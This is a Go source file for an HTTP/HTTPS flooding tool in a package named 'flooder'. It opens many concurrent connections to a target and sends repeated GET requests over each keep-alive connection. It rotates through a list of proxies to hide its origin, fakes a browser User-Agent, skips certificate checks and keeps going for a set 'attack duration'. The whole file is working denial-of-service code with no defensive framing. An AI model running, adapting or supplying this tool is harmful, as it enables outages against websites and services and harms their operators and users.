package main

import (
	"crypto/tls"
	"flag"
	"flooder/Utils"
	"math/rand"
	"net"
	"net/url"
	"os"
	"strings"
	"time"
)

var (
	TLSConfig = &tls.Config{
		MinVersion: tls.VersionTLS12, // 设置最低支持版本为TLS1.2
		CurvePreferences: []tls.CurveID{
			tls.X25519,
			tls.CurveP256,
			tls.CurveP384,
		}, // 支持的曲线类型
		InsecureSkipVerify:       true, // 是否需要验证服务器证书
		PreferServerCipherSuites: true, // 使用服务器加密套件列表中的加密算法
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
			tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_RSA_WITH_AES_128_CBC_SHA,
			tls.TLS_RSA_WITH_AES_256_CBC_SHA,
		}, // 支持的加密套件列表
	}
	target        = flag.String("target", "127.0.0.1:8080", "ip:port")
	reslove        = flag.String("reslove", "127.0.0.1", "reslove as ip:port")
	threads       = flag.Int("threads", 1, "how many threads")
	repeatRequest = flag.Int("repeatRequest", 70, "abuse keep-alive connection")
	noProxiedRate = flag.Float64("noProxiedRate", 0.6, "rate of unproxied connection")
	proxies       = flag.String("proxies", "no proxy", "path 2 proxies file")
	duration = flag.Int("duration", 60, "attac duration in sec")
)

func main() {
	flag.Parse()
	if !strings.Contains(*target, "http") {
		*target = "http://" + *target
	}
	parsedTarget, err := url.Parse(*target)
	if err != nil {
		panic(err)
	}
	*target = Utils.ToIPWithPort(parsedTarget, strings.ToLower(parsedTarget.Scheme) == "https")
	if parsedTarget.Path == "" {
		parsedTarget.Path = "/"
	}

	rand.Seed(1337)
	proxyLines := []string{"no proxy"}
	if *proxies != "no proxy" {
		proxyLines = Utils.FileToList(*proxies)
	}
	TLSConfig.ServerName = parsedTarget.Hostname() //SNI
	payload := []byte{}
	if parsedTarget.Port() != "443" && parsedTarget.Port() != "80" {
		payload = []byte("GET " + parsedTarget.Path + " HTTP/1.1\r\nHost: " + parsedTarget.Hostname() + ":" + parsedTarget.Port() + "\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:114.0) Gecko/20100101 Firefox/114.0\r\nAccept: */*\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: Keep-Alive\r\nSec-GPC: 1\r\nTE: trailers\r\n\r\n")
	} else {
		payload = []byte("GET " + parsedTarget.Path + " HTTP/1.1\r\nHost: " + parsedTarget.Hostname() + "\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:114.0) Gecko/20100101 Firefox/114.0\r\nAccept: */*\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: Keep-Alive\r\nSec-GPC: 1\r\nTE: trailers\r\n\r\n")
	}
	if(*reslove != "127.0.0.1"){
		*target = *reslove + parsedTarget.Port()
	}
	println(strings.ToLower(parsedTarget.Scheme), *target)
	println(string(payload))
	for i := 0; i < *threads; i++ {
		go flood(*target, payload, proxyLines, strings.ToLower(parsedTarget.Scheme) == "https", *repeatRequest)
	}

	// 等待 60 秒后退出程序
	go func() {
		time.Sleep(time.Duration(*duration) * time.Second)
		os.Exit(0)
	}()
	select {}
}
func flood(target string, payload []byte, proxies []string, https bool, repeatRequest int) {
	for {
		proxyURL := proxies[rand.Intn(len(proxies))]

		http_flood(proxyURL, target, payload, https, repeatRequest)
	}
}
func https_flood(proxyConn net.Conn, payload []byte, repeatRequest int) {
	tlsConn := tls.Client(proxyConn, TLSConfig)
	for i := 0; i < repeatRequest; i++ {
		tlsConn.Write(payload)
	}
	tlsConn.Close()
}

func http_flood(proxyAddr, targetAddr string, payload []byte, https bool, repeatRequest int) {
	for {
		if proxyAddr == "no proxy" || rand.Float64() < *noProxiedRate {
			proxyAddr = targetAddr
		}
		proxyConn, err := net.DialTimeout("tcp", proxyAddr, 5*time.Second)

		if err != nil {
			return
		}
		proxyConn.SetDeadline(time.Now().Add(5 * time.Second))
		if proxyAddr != targetAddr {
			Utils.StartProxyHTTP(proxyConn, targetAddr)
		}
		// Now conn is a transparent proxy connection to the target server
		if https {
			https_flood(proxyConn, payload, repeatRequest)
		} else {
			for i := 0; i < repeatRequest; i++ {
				proxyConn.Write(payload)
			}
		}
		proxyConn.Close()

	}
}
